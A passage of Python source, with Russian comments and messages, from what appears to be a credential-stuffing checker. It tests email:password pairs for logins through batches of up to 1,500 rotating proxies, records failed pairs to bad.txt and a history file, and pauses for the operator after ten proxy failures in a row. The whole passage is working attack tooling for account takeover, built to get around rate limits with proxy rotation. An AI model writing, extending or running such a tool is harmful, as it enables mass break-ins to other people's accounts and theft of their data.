                    log(f"[BAD] {self.email}:{self.password}", Color.RED)
                    with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
                    add_to_history(self.history_path, self.full_line)
                    stats['bad'] += 1
        except: pass

    def run(self):
        pause_event.wait() 
        
        with proxy_lock:
            current_proxies = random.sample(all_proxies, min(len(all_proxies), 1500))
        
        chunk_size = 500
        for i in range(0, len(current_proxies), chunk_size):
            if self.found or not pause_event.is_set(): break
            batch = current_proxies[i:i+chunk_size]
            with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
                executor.map(self.check_proxy, batch)
        
        if not self.found:
            with stats_lock:
                stats['fail_streak'] += 1
                current_streak = stats['fail_streak']
            
            log(f"[FAIL {current_streak}/10] {self.email} - Прокси не пробили", Color.YELLOW)
            add_to_history(self.history_path, self.full_line)
            
            if current_streak >= 10:
                self.trigger_manual_pause(current_streak)
        
        with print_lock: stats['left'] -= 1

    def trigger_manual_pause(self, streak):
        with print_lock:
            if not pause_event.is_set(): return # Уже на паузе
            pause_event.clear()

        def stopwatch():
            start_t = time.time()
            while not pause_event.is_set():
                elapsed = int(time.time() - start_t)
                mins, secs = divmod(elapsed, 60)
                sys.stdout.write(f"\r{Color.YELLOW}[!!!] ПАУЗА ({streak} FAIL). Прошло времени: {mins:02d}:{secs:02d} | Нажмите ENTER для продолжения...{Color.RESET}")
                sys.stdout.flush()
                time.sleep(1)

        # Запускаем визуальный секундомер
        threading.Thread(target=stopwatch, daemon=True).start()
        
        # Ждем нажатия Enter в основном потоке (или в текущем)
        input() 
        
        with stats_lock: stats['fail_streak'] = 0
        pause_event.set()
        log("\n[>>>] Работа возобновлена пользователем!", Color.CYAN)

